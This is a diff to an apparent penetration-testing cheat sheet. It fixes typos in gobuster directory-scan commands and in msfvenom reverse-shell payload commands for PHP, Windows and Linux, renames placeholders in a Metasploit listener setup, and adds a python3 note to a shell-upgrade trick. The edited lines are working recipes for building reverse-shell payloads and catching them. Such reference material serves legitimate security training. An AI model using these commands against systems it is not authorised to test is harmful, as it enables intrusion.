@@ -250,7 +250,7 @@ $ gobuster dir -u http://192.168.1.32 -w /usr/share/wordlists/dirbuster/director
 $ gobuster dir -u http://192.168.5.24/confidential -w custom_wordlist.txt
 
 # Directory scan with authentication
-$ gobster dir -u http://192.168.4.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U admin
+$ gobuster dir -u http://192.168.4.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U admin
 ```
 
 #### Directory Fuzzing with `dirb`
@@ -422,8 +422,8 @@ For example, to configure a listener for a reverse shell:
 ```
 $ msfconsole
 $ use exploit/multi/handler
-$ set payload <REVERSE_SHELL PAYLOAD>
-$ set LHOST <YOUR IP>
+$ set payload <REVERSE SHELL PAYLOAD>
+$ set LHOST <LISTENER IP>
 $ set LPORT <LISTENER PORT>
 $ exploit
 ```
@@ -433,19 +433,19 @@ $ exploit
 Standard PHP reverse shell:
 
 ```
-$ msfvenom -p php/reverse_php LHOST-<YOUR IP> LPORT-<LISTENER PORT> -o <OUTPUT FILE NAME>
+$ msfvenom -p php/reverse_php LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -o <OUTPUT FILE NAME>
 ```
 
 Windows reverse shell:
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST-<YOUR IP> LPORT-<LISTENER PORT> -f dll > shell.dll
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f dll > shell.dll
 ```
 
 Linux reverse shell:
 
 ```
-$ msfvenom -p linux/x64/shell/reverse_tcp LHOST-<YOUR IP> LPORT-<LISTENER PORT> -f elf > shell.elf
+$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f elf > shell.elf
 ```
 
 #### Meterpreter Shell Commands
@@ -505,6 +505,8 @@ $ python -c "import pty; pty.spawn('/bin/bash')"
 # Finally, export XTERM (allows you to clear terminal)
 $ export TERM=xterm
 ```
+
+**NOTE**: this works the same with `python3`.
 
 ## Bruteforcing
 
